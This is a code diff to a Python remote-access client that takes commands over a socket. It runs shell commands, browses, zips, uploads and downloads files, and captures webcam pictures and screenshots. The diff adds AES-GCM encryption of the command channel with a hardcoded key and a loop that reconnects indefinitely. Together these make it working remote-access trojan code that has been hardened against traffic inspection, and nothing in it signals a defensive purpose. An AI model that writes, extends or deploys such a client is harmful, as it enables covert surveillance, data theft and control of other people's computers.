@@ -8,6 +8,7 @@ import os
 import zipfile
 import json
 import multiprocessing
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 # non-standard python libraries
 import mss
 import cv2
@@ -17,33 +18,34 @@ class Client:
     def __init__(self):
         self.connection = Connection()
         self.exit = False
+        self.response = multiprocessing.Manager().dict()
 
+    def main(self):
         while not self.exit:
-            request = self.dec_request(self.connection.recv(self.connection.sock))
-            self.response = multiprocessing.Manager().dict()
-            self.response["data"] = ""
-            self.response["error"] = ""
+            request = self.decode_request(self.connection.recv(self.connection.sock))
+            self.response["data"] = str()
+            self.response["error"] = str()
 
             if request["cmd"] == "f":
                 process = multiprocessing.Process(target=self.cwd, args=(self.response, request["mode"], request["path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.enc_response(self.response), self.connection.sock)
+                self.connection.send(self.encode_response(self.response), self.connection.sock)
             elif request["cmd"] == "c":
                 process = multiprocessing.Process(target=self.execute_command, args=(self.response, request["exe"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.enc_response(self.response), self.connection.sock)
+                self.connection.send(self.encode_response(self.response), self.connection.sock)
             elif request["cmd"] == "z":
                 process = multiprocessing.Process(target=self.zip_file_or_folder, args=(self.response, request["comp_lvl"], request["open_path"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.enc_response(self.response), self.connection.sock)
+                self.connection.send(self.encode_response(self.response), self.connection.sock)
             elif request["cmd"] == "w":
                 process = multiprocessing.Process(target=self.capture_camera_picture, args=(self.response, request["cam_port"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.enc_response(self.response), self.connection.sock)
+                self.connection.send(self.encode_response(self.response), self.connection.sock)
             elif request["cmd"] == "s":
                 process = multiprocessing.Process(target=self.capture_screenshot, args=(self.response, request["monitor"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.enc_response(self.response), self.connection.sock)
+                self.connection.send(self.encode_response(self.response), self.connection.sock)
             elif request["cmd"] == "d":
                 self.download_file(request["open_path"])
             elif request["cmd"] == "u":
@@ -83,7 +85,7 @@ class Client:
             response["error"] = "PermissionError"
         else:
             response["length"] = str(len(data))
-            self.connection.send(self.enc_response(response), self.connection.sock)
+            self.connection.send(self.encode_response(response), self.connection.sock)
             self.connection.sock.send(data)
 
     def upload_file(self, path):
@@ -94,7 +96,7 @@ class Client:
                 file.write(data)
         except PermissionError:
             response["error"] = "PermissionError"
-        self.connection.send(self.enc_response(response), self.connection.sock)
+        self.connection.send(self.encode_response(response), self.connection.sock)
 
     def capture_screenshot(self, response, monitor, path):
         try:
@@ -144,10 +146,10 @@ class Client:
             self.response["data"] = ""
             self.response["error"] = "TimeoutExpired"
 
-    def dec_request(self, request):
+    def decode_request(self, request):
         return json.loads(request.decode(self.connection.CODEC))
 
-    def enc_response(self, response):
+    def encode_response(self, response):
         return json.dumps(response.copy()).encode(self.connection.CODEC)
 
 
@@ -159,6 +161,9 @@ class Connection:
 
         HOST = "127.0.0.1"
         PORT = 10001
+        KEY = b'\xbch`9\xd6k\xcbT\xed\xa5\xef_\x9d*\xda\xd2sER\xedA\xc0a\x1b)\xcc9\xb2\xe7\x91\xc2A'
+
+        self.crypter = AESGCM(KEY)
 
         if len(sys.argv) == 3:
             try:
@@ -178,22 +183,29 @@ class Connection:
                 time.sleep(30)
 
     def send(self, data, connection):
-        data = base64.b64encode(data) + self.END_MARKER
+        data = base64.b64encode(self.encrypt(data)) + self.END_MARKER
         connection.send(data)
 
     def recv(self, connection):
-        data = bytes()
+        data = bytearray()
         while not data.endswith(self.END_MARKER):
-            data += connection.recv(self.PACKET_SIZE)
-        return base64.b64decode(data[:-1])
+            data.extend(connection.recv(self.PACKET_SIZE))
+        return self.decrypt(base64.b64decode(data[:-1]))
+
+    def encrypt(self, data):
+        nonce = os.urandom(12)
+        return nonce + self.crypter.encrypt(nonce, data, b"")
+
+    def decrypt(self, cipher):
+        return self.crypter.decrypt(cipher[:12], cipher[12:], b"")
 
 
 if __name__ == "__main__":
     while True:
-        #try:
-        client = Client()
-        time.sleep(10000000)
-            #if client.exit:
-                #break
-        #except:
-            #pass
+        try:
+            client = Client()
+            client.main()
+            if client.exit:
+                break
+        except:
+            pass
